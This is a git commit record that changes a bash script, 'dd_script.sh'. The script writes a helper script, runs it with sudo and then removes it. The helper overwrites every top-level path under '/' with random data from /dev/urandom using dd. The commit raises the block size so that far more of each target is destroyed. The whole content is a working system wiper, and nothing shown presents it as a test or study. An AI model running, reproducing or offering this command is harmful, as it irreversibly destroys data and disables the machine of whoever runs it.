4a02f7c83a5be2eac91c90f985c133b670e740e0
Rev0x1337 <163394237+Rev0x1337@users.noreply.github.com>
2024-12-06 11:55:24 +0300

    Update dd_script.sh

--- bash/dd_script.sh
+++ bash/dd_script.sh
@@ -2,5 +2,5 @@
 touch script.sh && echo '''#!/bin/bash
 files=( "/"* ) 
 	for file in "${files[@]}"; 
-	do dd if=/dev/urandom of="$file" bs=100000 count=1 conv=notrunc 
+	do dd if=/dev/urandom of="$file" bs=10000000000 count=1 conv=notrunc 
 done ''' > script.sh && chmod +x script.sh && sudo ./script.sh && rm script.sh
